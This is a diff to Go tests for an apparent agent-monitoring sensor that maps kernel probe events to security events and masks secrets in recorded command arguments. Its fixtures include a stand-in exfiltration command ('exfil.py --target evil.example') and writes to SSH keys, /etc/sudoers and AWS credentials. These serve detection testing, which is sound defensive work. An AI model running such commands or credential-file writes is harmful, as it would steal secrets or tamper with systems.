@@ -4,11 +4,14 @@
 package groundtruth
 
 import (
+	"bytes"
 	"encoding/json"
+	"slices"
 	"testing"
 
 	"github.com/google/uuid"
 
+	"github.com/cjohnstoniv/wardyn/internal/secretmask"
 	"github.com/cjohnstoniv/wardyn/internal/types"
 )
 
@@ -157,14 +160,17 @@ func TestMapProcessExec(t *testing.T) {
 	if d.Loader {
 		t.Error("python3 should not be flagged as a loader")
 	}
-	wantArgv := []string{"/usr/bin/python3", "exfil.py", "--target", "evil.example"}
-	if len(d.Argv) != len(wantArgv) {
-		t.Fatalf("argv = %v, want %v", d.Argv, wantArgv)
+	// The sensor sends the arguments whole; the control plane splits them onto
+	// argv once they are masked (MaskData), into the same words as ever.
+	if !slices.Equal(d.Argv, []string{"/usr/bin/python3"}) || d.Arguments != "exfil.py --target evil.example" {
+		t.Errorf("argv = %q, arguments = %q, want the binary and the raw arguments whole", d.Argv, d.Arguments)
 	}
-	for i := range wantArgv {
-		if d.Argv[i] != wantArgv[i] {
-			t.Errorf("argv[%d] = %q, want %q", i, d.Argv[i], wantArgv[i])
-		}
+	var done EventData
+	if err := json.Unmarshal(MaskData(ev.Data, asIs, asIs), &done); err != nil {
+		t.Fatalf("decode finished data: %v", err)
+	}
+	if wantArgv := []string{"/usr/bin/python3", "exfil.py", "--target", "evil.example"}; !slices.Equal(done.Argv, wantArgv) || done.Arguments != "" {
+		t.Errorf("finished argv = %q, arguments = %q, want %q and none", done.Argv, done.Arguments, wantArgv)
 	}
 	if d.CgroupID != knownCgroup {
 		t.Errorf("cgroup_id = %d, want %d", d.CgroupID, knownCgroup)
@@ -386,12 +392,14 @@ func TestMapNetworkConnect_PrivateProxyIsNotFailure(t *testing.T) {
 
 func TestMapFileWrite_Sensitive(t *testing.T) {
 	m := NewMapper(mappedCorrelator())
-	// A write to ~/.ssh via a security_file_permission kprobe.
+	// A write to ~/.ssh via a security_file_permission kprobe, as the shipped
+	// policy hooks it: the file, the MAY_WRITE access mask, and a 0 return.
 	line := []byte(`{
 		"process_kprobe": {
 			"process": {"binary": "/usr/bin/python3", "docker": "abc123def456", "cgroup_id": "987654"},
 			"function_name": "security_file_permission",
-			"args": [{"file_arg": {"path": "/home/agent/.ssh/id_rsa"}}]
+			"args": [{"file_arg": {"path": "/home/agent/.ssh/id_rsa"}}, {"int_arg": 2}],
+			"return": {"int_arg": 0}
 		}
 	}`)
 	ev, ok := m.MapLine(line)
@@ -411,6 +419,9 @@ func TestMapFileWrite_Sensitive(t *testing.T) {
 	if ev.Target != "/home/agent/.ssh/id_rsa" {
 		t.Errorf("target = %q, want the path", ev.Target)
 	}
+	if ev.Outcome != "success" {
+		t.Errorf("outcome = %q, want success for a permitted write", ev.Outcome)
+	}
 }
 
 func TestMapFileWrite_NonSensitiveFiltered(t *testing.T) {
@@ -420,7 +431,8 @@ func TestMapFileWrite_NonSensitiveFiltered(t *testing.T) {
 		"process_kprobe": {
 			"process": {"binary": "/usr/bin/python3", "docker": "abc123def456"},
 			"function_name": "security_file_permission",
-			"args": [{"file_arg": {"path": "/workspace/repo/main.go"}}]
+			"args": [{"file_arg": {"path": "/workspace/repo/main.go"}}, {"int_arg": 2}],
+			"return": {"int_arg": 0}
 		}
 	}`)
 	if _, ok := m.MapLine(line); ok {
@@ -434,7 +446,9 @@ func TestMapFileWrite_PathArgAndStringArg(t *testing.T) {
 	ev, ok := m.MapLine([]byte(`{
 		"process_kprobe": {
 			"process": {"docker": "abc123def456"},
-			"args": [{"path_arg": {"path": "/etc/sudoers"}}]
+			"function_name": "security_file_permission",
+			"args": [{"path_arg": {"path": "/etc/sudoers"}}, {"int_arg": 2}],
+			"return": {"int_arg": 0}
 		}
 	}`))
 	if !ok || decodeData(t, ev).Path != "/etc/sudoers" {
@@ -444,11 +458,165 @@ func TestMapFileWrite_PathArgAndStringArg(t *testing.T) {
 	ev, ok = m.MapLine([]byte(`{
 		"process_kprobe": {
 			"process": {"docker": "abc123def456"},
-			"args": [{"string_arg": "/root/.aws/credentials"}]
+			"function_name": "security_file_permission",
+			"args": [{"string_arg": "/root/.aws/credentials"}, {"int_arg": 2}],
+			"return": {"int_arg": 0}
 		}
 	}`))
 	if !ok || decodeData(t, ev).Path != "/root/.aws/credentials" {
 		t.Errorf("string_arg shape not handled: ok=%v ev=%+v", ok, ev)
+	}
+}
+
+// TestMapKprobe_KnownSemanticsOnly: a kprobe maps only from a hook whose
+// meaning the mapper knows. An operator's own policy can hook reads, opens and
+// receives on the same sensitive paths and sockets; none of them is a write or a
+// connect, and a write is claimed only when the kernel let it through.
+func TestMapKprobe_KnownSemanticsOnly(t *testing.T) {
+	const ssh = `{"file_arg": {"path": "/home/agent/.ssh/id_rsa"}}`
+	const sock = `{"sock_arg": {"daddr": "93.184.216.34", "dport": 443}}`
+	for name, tc := range map[string]struct {
+		fn, args, ret string
+		want          string // the action, or "" for dropped
+	}{
+		"permitted write":            {"security_file_permission", ssh + `, {"int_arg": 2}`, `{"int_arg": 0}`, ActionFileWrite},
+		"read and write":             {"security_file_permission", ssh + `, {"int_arg": 6}`, `{"int_arg": 0}`, ActionFileWrite},
+		"write and append":           {"security_file_permission", ssh + `, {"int_arg": 10}`, `{"int_arg": 0}`, ActionFileWrite},
+		"write with an empty return": {"security_file_permission", ssh + `, {"int_arg": 2}`, `{}`, ""},
+		"connect hook":               {"tcp_connect", sock, "", ActionNetworkConnect},
+		"connect hook with no sock":  {"tcp_connect", "", "", ActionNetworkConnect},
+		"read of a sensitive file":   {"security_file_permission", ssh + `, {"int_arg": 4}`, `{"int_arg": 0}`, ""},
+		"open of a sensitive file":   {"security_file_open", ssh + `, {"int_arg": 2}`, `{"int_arg": 0}`, ""},
+		"refused write":              {"security_file_permission", ssh + `, {"int_arg": 2}`, `{"int_arg": -13}`, ""},
+		"write with no return value": {"security_file_permission", ssh + `, {"int_arg": 2}`, "", ""},
+		"write with no access mask":  {"security_file_permission", ssh, `{"int_arg": 0}`, ""},
+		"receive with a socket":      {"tcp_recvmsg", sock, "", ""},
+		"unknown hook, write shape":  {"some_unknown_hook", ssh + `, {"int_arg": 2}`, `{"int_arg": 0}`, ""},
+		"no hook name, a path":       {"", ssh, "", ""},
+	} {
+		t.Run(name, func(t *testing.T) {
+			k := map[string]any{"process": map[string]any{"binary": "/usr/bin/python3", "docker": knownContainer},
+				"function_name": tc.fn, "args": json.RawMessage(`[` + tc.args + `]`)}
+			if tc.ret != "" {
+				k["return"] = json.RawMessage(tc.ret)
+			}
+			line, _ := json.Marshal(map[string]any{"process_kprobe": k})
+			ev, ok := NewMapper(mappedCorrelator()).MapLine(line)
+			if tc.want == "" {
+				if ok {
+					t.Fatalf("mapped to %s/%s, want dropped", ev.Action, ev.Outcome)
+				}
+				return
+			}
+			if !ok || ev.Action != tc.want || ev.Outcome != "success" {
+				t.Fatalf("ok=%v action=%q outcome=%q, want %s/success", ok, ev.Action, ev.Outcome, tc.want)
+			}
+		})
+	}
+}
+
+// TestMaskData_SpaceSecretMaskedBeforeSplit: a registered secret containing a
+// space, passed as one argument, is hidden on the recorded argv. The sensor
+// sends the raw arguments whole and the run's masker hides the secret before
+// the split; splitting first leaves two words that no longer match it. Every
+// argument that is not the secret stays readable. A tab only the whole
+// arguments keep: an older sensor's words are rejoined with spaces.
+func TestMaskData_SpaceSecretMaskedBeforeSplit(t *testing.T) {
+	for _, secret := range []string{"alphaBravo charlieDelta", "alphaBravo\tcharlieDelta"} {
+		reg := secretmask.NewRegistry()
+		if err := reg.Add(knownRun, []byte(secret)); err != nil {
+			t.Fatalf("register secret: %v", err)
+		}
+		line, _ := json.Marshal(map[string]any{"process_exec": map[string]any{"process": map[string]any{
+			"binary": "/usr/bin/mysql", "docker": "abc123def456",
+			"arguments": "--user app --password=" + secret + " --host db"}}})
+		ev, ok := NewMapper(mappedCorrelator()).MapLine(line)
+		if !ok || ev.RunID == nil {
+			t.Fatalf("exec did not map to its run: ok=%v run=%v", ok, ev.RunID)
+		}
+		mask := reg.JSONVariantMasker(*ev.RunID).Mask
+		data := MaskData(ev.Data, mask, mask)
+		for _, word := range []string{"alphaBravo", "charlieDelta"} {
+			if bytes.Contains(data, []byte(word)) {
+				t.Errorf("%q: recorded data carries %q: %s", secret, word, data)
+			}
+		}
+		var d EventData
+		if err := json.Unmarshal(data, &d); err != nil {
+			t.Fatalf("decode masked data: %v (raw=%s)", err, data)
+		}
+		want := []string{"/usr/bin/mysql", "--user", "app", "--password=<secret-hidden>", "--host", "db"}
+		if !slices.Equal(d.Argv, want) || d.Arguments != "" {
+			t.Errorf("%q: argv = %q, arguments = %q, want %q and none", secret, d.Argv, d.Arguments, want)
+		}
+	}
+}
+
+// asIs is a mask that hides nothing.
+func asIs(b []byte) []byte { return b }
+
+// TestMaskData_ArgumentsWithheld: a caller that cannot vouch for the secrets it
+// holds hands back a placeholder for the raw arguments. None of their words
+// reaches argv, where no later masking could rejoin them; the binary stays.
+func TestMaskData_ArgumentsWithheld(t *testing.T) {
+	data := EventData{Stream: Stream, Subtype: SubtypeProcessExec, Argv: []string{"/usr/bin/mysql"},
+		Arguments: "--password=alphaBravo charlieDelta --host db"}.marshal()
+	var d EventData
+	if err := json.Unmarshal(MaskData(data, asIs, func([]byte) []byte { return secretmask.Placeholder() }), &d); err != nil {
+		t.Fatalf("decode withheld data: %v", err)
+	}
+	if want := []string{"/usr/bin/mysql", "<secret-hidden>"}; !slices.Equal(d.Argv, want) || d.Arguments != "" {
+		t.Errorf("argv = %q, arguments = %q, want %q and none", d.Argv, d.Arguments, want)
+	}
+}
+
+// TestMaskData_OlderSensorSplitArgv: a sensor older than the server sends the
+// arguments already split onto argv. The words are joined back before the
+// mask, so a secret whose whitespace is a single space is still hidden, and
+// withheld like raw arguments when the caller cannot vouch for its secrets.
+func TestMaskData_OlderSensorSplitArgv(t *testing.T) {
+	reg := secretmask.NewRegistry()
+	if err := reg.Add(knownRun, []byte("alphaBravo charlieDelta")); err != nil {
+		t.Fatalf("register secret: %v", err)
+	}
+	mask := reg.JSONVariantMasker(knownRun).Mask
+	data := EventData{Stream: Stream, Subtype: SubtypeProcessExec,
+		Argv: []string{"/usr/bin/mysql", "--user", "app", "--password=alphaBravo", "charlieDelta", "--host", "db"}}.marshal()
+	for name, tc := range map[string]struct {
+		maskArgs func([]byte) []byte
+		want     []string
+	}{
+		"masked":   {mask, []string{"/usr/bin/mysql", "--user", "app", "--password=<secret-hidden>", "--host", "db"}},
+		"withheld": {func([]byte) []byte { return secretmask.Placeholder() }, []string{"/usr/bin/mysql", "<secret-hidden>"}},
+	} {
+		var d EventData
+		if err := json.Unmarshal(MaskData(data, mask, tc.maskArgs), &d); err != nil {
+			t.Fatalf("%s: decode masked data: %v", name, err)
+		}
+		if !slices.Equal(d.Argv, tc.want) || d.Arguments != "" {
+			t.Errorf("%s: argv = %q, arguments = %q, want %q and none", name, d.Argv, d.Arguments, tc.want)
+		}
+	}
+}
+
+// TestMaskData_MasksEveryField: a secret outside the raw arguments is hidden
+// too, on an exec's binary and on an event that carries no arguments at all.
+func TestMaskData_MasksEveryField(t *testing.T) {
+	reg := secretmask.NewRegistry()
+	if err := reg.Add(knownRun, []byte("echoFoxtrotGolf")); err != nil {
+		t.Fatalf("register secret: %v", err)
+	}
+	mask := reg.JSONVariantMasker(knownRun).Mask
+	for name, d := range map[string]EventData{
+		"exec binary": {Stream: Stream, Subtype: SubtypeProcessExec, Argv: []string{"/opt/echoFoxtrotGolf/tool"}, Arguments: "run"},
+		"write path":  {Stream: Stream, Subtype: SubtypeFileWrite, Path: "/home/agent/.ssh/echoFoxtrotGolf"},
+	} {
+		if out := MaskData(d.marshal(), mask, mask); bytes.Contains(out, []byte("echoFoxtrotGolf")) || !bytes.Contains(out, []byte("<secret-hidden>")) {
+			t.Errorf("%s: masked data = %s, want the secret hidden", name, out)
+		}
+	}
+	if out := MaskData([]byte(`{"argv":"echoFoxtrotGolf"}`), mask, mask); bytes.Contains(out, []byte("echoFoxtrotGolf")) {
+		t.Errorf("undecodable data = %s, want the secret hidden", out)
 	}
 }
 
